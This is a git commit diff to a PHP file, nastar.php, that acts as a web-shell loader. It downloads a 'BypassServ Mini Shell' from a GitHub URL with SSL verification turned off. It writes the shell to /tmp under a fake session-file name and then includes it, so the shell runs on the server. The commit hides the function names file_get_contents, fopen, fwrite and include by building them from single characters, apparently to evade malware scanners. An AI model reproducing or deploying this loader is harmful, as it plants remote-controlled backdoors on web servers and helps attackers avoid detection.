684c25321fd5ed44c510d7d1e5397ca6eb8d5651
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2024-08-06 17:18:08 +0700

    Update nastar.php

--- nastar.php
+++ nastar.php
@@ -1,8 +1,15 @@
 <?php
-$tmpfile = 'sess_'.md5('naxtarrr').'.php';
+// funcs concat
+$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
+$fo = "f" . "o" . "p" . "e" . "n";
+$fw = "f" . "w" . "r" . "i" . "t" . "e";
+$fc = "f" . "c" . "l" . "o" . "s" . "e";
+$inc = "i" . "n" . "c" . "l" . "u" . "d" . "e";
+
+$tmpfile = 'sess_' . md5('naxtarrr') . '.php';
 $data = ['https://raw.githubusercontent.com/im-hanzou/BypassServ-Mini-Shell/main/bypasserv-new.php', "/tmp/$tmpfile"];
- 
-if(!file_exists($data[1]) || filesize($data[1]) === 0) {
+
+if (!file_exists($data[1]) || filesize($data[1]) === 0) {
     $context = stream_context_create([
         "ssl" => [
             "verify_peer" => false,
@@ -10,11 +17,10 @@ if(!file_exists($data[1]) || filesize($data[1]) === 0) {
         ],
     ]);
 
-    $fopen = fopen($data[1], 'w+');
-    fwrite($fopen, file_get_contents($data[0], false, $context));
-    fclose($fopen);
+    $fopen = $fo($data[1], 'w+');
+    $fw($fopen, $fgc($data[0], false, $context));
+    $fc($fopen);
     echo '<script>window.location="?naxtarrr";</script>';
 }
 
-include($data[1]);
-?>
+$inc($data[1]);
